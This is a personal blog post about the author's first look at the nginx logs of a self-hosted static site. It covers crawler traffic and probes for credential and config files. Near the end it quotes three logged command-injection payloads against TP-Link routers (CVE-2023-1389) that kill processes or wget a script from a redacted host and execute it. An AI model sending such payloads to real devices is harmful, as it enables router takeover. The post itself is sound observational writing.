---
title: Beautiful women named SM-G892A Bulid/NRD90M keep trying to access my /wp-admin
description: Opening the can of worms otherwise known as my nginx logs
date: 2024-07-20T20:10:00+02:00
tags: indieweb
---

For the low price of an additional €2.5 to my monthly Internet bill (for the static IP) I can now just drag `html` files into a network folder on my Raspberry Pi and have them appear online, in the form of this site. And I can see all the logs! These are pretty interesting, because there really are a lot of crawlers out there. I knew there would be *some*, but reading the logs for the first time felt like playing one of those horror games in which everything is okay until you use the flashlight.

In the last 24 hours (ish), the crawlers have constituted 51.06% of the traffic, and `robots.txt` has been the second most requested file (after the favicon). I used the advice from [darkvisitors.com](https://darkvisitors.com/docs/robots-txt) for the `robots.txt` file, but it feels a bit silly that I have to specifically mention the user agents in the file before I even know that they exist. Who are `AhrefsBot`, `ImagesiftBot`, `SemrushBot`, `SeznamBot`, `CensysInspect`, or `BazQuxReaderMediaProxy`? And it's not like they have to respect my wishes anyway. By analyzing the logs I can see whether they have, but I'm not sure if I care that much. 

The requests that returned a 404 Not Found error were somewhat interesting. I did expect that `/wp-admin`, `/wp-login/`, `/wp-includes/`, etc. would be fairly popular crawl destinations, but I felt a bit betrayed that the crawlers were also interested in my `/.env` file, as well as in the `/.git/config` and `/.git-credentials`. The crawlers also looked for a `/config.json`, a `/docker-compose.yml`, a `/debug/vars`, or a `/app/config/parameters.yml`. There was also a request for the PHP debug bar or a `/cgi-bin/printenv.pl` file, which I assume would be a perl script that would print the environmental variables.

Some requests were also probing for cross-site scripting vulnerabilities. There were requests for versions of jQuery lower than 3.5.0, or for a file called `MultiFileUploader.ashx`. There was a request for `/+CSCOE+/logon.html`, which is a [HTTP response splitting](https://en.wikipedia.org/wiki/HTTP_response_splitting) vulnerability present in [some Cisco servers](https://bst.cisco.com/quickview/bug/CSCth63101). I think the most interesting requests were the following ones:

<pre>
  <code style="white-space: pre-line; line-break: anywhere;">
    /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`for+proc_dir+in+/proc/[0-9]*;+do+pid=${proc_dir##*/};+buffer=$(cat+"/proc/$pid/maps");+if+[+"${#buffer}"+-gt+1+];+then+if+[+"${buffer#*"/lib/"}"+=+"$buffer"+]+&&+[+"${buffer#*"telnetdbot"}"+=+"$buffer"+];+then+kill+-9+"$pid";+fi;+fi;+done`)
  </code>
</pre>

<pre>
  <code style="white-space: pre-line; line-break: anywhere;">
    /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+wget.sh;+wget+http://[REDACTED]/wget.sh;+chmod+777+wget.sh;+./wget.sh+tplink;+rm+-rf+wget.sh`)
  </code>
</pre>

<pre>
  <code style="white-space: pre-line; line-break: anywhere;">
    /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+r;+wget+http://[REDACTED]/r;+chmod+777+r;+./r+tplink;+rm+-rf+r`)
  </code>
</pre>

These ones truly tell a story. I replaced IP addresses with `[REDACTED]`. I assume that's where the payload is hosted. These requests [would work on some TP-Link routers](https://nvd.nist.gov/vuln/detail/CVE-2023-1389), but we don't have a TP-Link router, the router that we have is not out on the Internet by itself, and the current configuration shouldn't allow for anything like that.

But I do feel I need to be more mindful about it, and keep the configuration as simple as possible, sticking to static sites for now. All these requests were present in just two `access.log` files (from two days). I might update this post if I see more interesting things in there. I used [GoAccess](https://goaccess.io/) to parse the logs, but I feel like it's slightly obscuring the data, so I'll probably try to find a better set-up.
